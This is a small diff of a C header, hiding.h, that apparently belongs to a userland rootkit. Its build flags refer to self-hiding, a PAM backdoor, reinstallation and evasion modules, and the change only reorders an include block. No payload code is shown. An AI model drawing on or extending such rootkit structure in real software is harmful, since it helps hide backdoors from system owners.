@@ -1,13 +1,7 @@
 #ifndef HIDING_H
-#define HIDING_H   
+#define HIDING_H
 
 #include "files/files.h"
-
-#if defined(BLOCK_STRINGS) && defined(DO_EVASIONS)
-int scary_path(char *string);
-int block_strings(char *const argv[]);
-#include "evasion/block_strings.c"
-#endif
 
 #ifdef DO_REINSTALL
 void reinstall(void);
@@ -19,6 +13,12 @@ void reinstall(void);
  * first. */
 #if defined(DO_EVASIONS) && defined(DO_REINSTALL)
 #include "evasion/evasion.h"
+#endif
+
+#if defined(BLOCK_STRINGS) && defined(DO_EVASIONS)
+int scary_path(char *string);
+int block_strings(char *const argv[]);
+#include "evasion/block_strings.c"
 #endif
 
 #if defined(HIDE_SELF) && defined(USE_PAM_BD) 
